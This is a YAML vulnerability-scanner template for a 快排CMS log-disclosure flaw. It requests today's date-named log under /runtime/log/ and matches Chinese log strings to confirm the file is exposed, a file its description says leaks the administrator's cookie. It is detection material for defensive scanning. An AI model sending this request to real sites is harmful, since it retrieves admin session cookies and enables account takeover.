expression: r0()
id: kpcms-socket-login-info-disclosure
info:
  author: daffainfo
  description: "\u5FEB\u6392CMS \u9ED8\u8BA4\u5F00\u542F\u65E5\u5FD7\u8BB0\u5F55\uFF0C\
    \u7531\u4E8E\u65E5\u5FD7\u540D\u4E3A\u65F6\u95F4\u4F5C\u4E3A\u6587\u4EF6\u540D\
    \uFF0C\u9020\u6210\u7BA1\u7406\u5458\u7684Cookie\u6CC4\u9732"
  name: "\u5FEB\u6392CMS Socket.php \u65E5\u5FD7\u4FE1\u606F\u6CC4\u9732\u6F0F\u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS%20Socket.php%20%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  severity: medium
  verified: false
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(b'\u8FD0\u884C\u65F6\
      \u95F4') && response.body.bcontains(b'\u541E\u5410\u7387') && response.body.bcontains(b'\u5185\
      \u5B58\u6D88\u8017')"
    request:
      method: GET
      path: /runtime/log/{{foldername}}/{{filename}}.log
set:
  filename: day(0)
  foldername: year(0) + month(0)
